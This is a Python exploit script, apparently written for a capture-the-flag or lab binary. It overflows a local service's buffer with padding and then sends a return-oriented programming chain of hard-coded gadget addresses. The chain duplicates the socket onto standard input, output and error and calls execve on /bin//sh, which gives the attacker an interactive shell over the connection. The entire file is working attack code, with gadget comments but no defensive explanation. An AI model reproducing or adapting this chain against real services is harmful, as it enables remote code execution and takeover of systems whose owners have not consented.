#!/usr/bin/env python

from struct import pack
from console import console
import socket
import sys
import time

if len(sys.argv) != 2:
    sys.exit("Usage: %s PORT" % sys.argv[0])

def send_cmd(cmd1, cmd2):
    port = int(sys.argv[1])
    sock = socket.create_connection(('127.0.0.1', port),
                                    socket.getdefaulttimeout(),
                                    ('127.0.0.1', 0))

    sock.sendall(cmd1)

    #while True:
    #	 buf = sock.recv(1024)
    # 	 if not buf:
    #		break
    #    	sys.stdout.write(buf)
    #sock.close()
    time.sleep(1)
    sock.sendall(cmd2)
    console(sock)  
    sock.close()

#first command of 1023 chars
cmd1 = ""
pad = "a"

for x in range(0, 1023):
	cmd1 = "".join((cmd1, pad))

#second command of 29 to reach 1052 and start writing first gadget's address
p = ""

for x in range(0, 29):
	p = "".join((p, pad))	


#To dynamically get the socket file descriptor: dup one among 0, 1, 2 with standard dup, that will give the first available fd. Sock will be fd -1 

#dup
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x29)	    # 0x29 <-> dup
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#close
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x0)
p += pack('<I', 0x080831b3) # add ebx, eax ; lea esi, dword ptr [esi] ; xor eax, eax ; ret
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x06)	    # 6
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#ebx has sock+1
p += pack('<I', 0x08134226) # dec ebx ; ret

#dup2(sock, 0)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x0)	    # 0
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#dup2(sock, 1)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x1)	    # 1
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#dup2(sock, 2)
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x2)	    # 2
p += pack('<I', 0x080f1016) # pop eax ; ret
p += pack('<I', 0x3f)	    # 0x3f <-> dup2 
p += pack('<I', 0x08085cc0) # int 0x80 ; ret

#shell
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139064) # @ .data + 4
p += pack('<I', 0x080f1016) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481e1) # pop ebx ; ret
p += pack('<I', 0x08139060) # @ .data
p += pack('<I', 0x0812b35b) # pop ecx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x0808522a) # pop edx ; ret
p += pack('<I', 0x08139068) # @ .data + 8
p += pack('<I', 0x080f1015) # inc eax ; pop eax ; ret
p += pack('<I', 0xb) # 11, execve syscall id
p += pack('<I', 0x08074ded) # int 0x80

send_cmd(cmd1, p)

# :vim set sw=4 ts=8 sts=8 expandtab:
